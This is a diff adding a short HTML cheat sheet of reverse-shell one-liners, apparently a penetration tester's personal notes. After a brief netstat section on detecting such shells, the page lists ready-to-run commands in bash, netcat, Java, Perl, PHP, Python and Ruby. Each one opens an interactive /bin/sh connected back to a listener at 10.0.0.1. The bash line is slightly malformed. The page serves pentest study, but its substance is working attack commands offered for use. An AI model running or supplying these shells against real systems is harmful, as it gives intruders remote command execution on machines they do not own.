@@ -1,0 +1,33 @@
+<title>kyli0x.reverse-shells</title><link rel="icon" href="../fav.ico"><link rel="stylesheet" href="../style.css"><pre>
+<h2><sub><sup><a href="../index.html">home</a>/<a href="index.html">kbs</a></sup></sub><br>reverse shell cheatsheet</h2>
+
+:: check for reverse / bind shell
+    <code>netstat -antp | grep LISTEN</code> # unwanted ports
+    <code>netstat -antp | grep ESTABLISHED</code> # suspicious connections
+    <code>netstat -antp | grep SYN_SENT</code> # failed to reach attacker
+
+:: Reasons for needing reverse shells
+    not possible to add a new account / .rhosts file / SSH key
+
+:: All examples are tailed for unix-like systems. some examples should also work on windows if you replace <code>/bin/sh</code> with <code>cmd.exe</code>
+
+<h3>bash</h3><code>    bash -i >& /dev/tcp/10.0.0.1/8080 0>&10.0.0.1</code>
+
+<h3>netcat</h3><code>    nc -e /bin/sh 10.0.0.1 1234</code>
+:: some versions of nc dont support -e flag. if you have wrong version of nc installed, you might still get a reverse shell back by using the following:<code>
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f</code>
+
+<h3>java</h3><code>    r = Runtime.getRuntime()
+    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+    p.waitFor()</code>
+
+<h3>perl</h3><code>    perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code>
+
+<h3>php</h3><code>    php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code> # uses file descriptor 3, if failed try 4, 5, 6..
+
+<h3>python 2.7</h3><code>    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code>
+
+<h3>ruby</h3><code>    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</code>
+
+tags: reverseshell, cheatsheet, bash, netcat, nc, pentest, perl, php, ruby
+<footer>&copy; 2022⌜&iexcl;kyli0x</footer>
